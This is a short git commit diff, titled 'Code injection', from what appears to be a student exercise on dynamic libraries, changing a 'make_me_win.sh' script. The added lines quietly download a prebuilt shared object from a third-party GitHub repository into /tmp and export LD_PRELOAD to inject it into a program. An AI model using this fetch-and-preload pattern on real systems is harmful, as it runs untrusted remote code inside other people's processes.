5f808e369363d6da6911e2809d46c78c1ec8ddc0
Otido Peter <peterotido@gmail.com>
2022-10-06 02:16:31 -0700

    Code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc *.o -fPIC -shared -o libruin.so
-LD_PRELOAD=$WPD/libruin.so
+wget -qP /tmp/ https://github.com/osala-eng/alx-low_level_programming/raw/master/0x18-dynamic_libraries/mymole.so
+export LD_PRELOAD="/tmp/mymole.so"
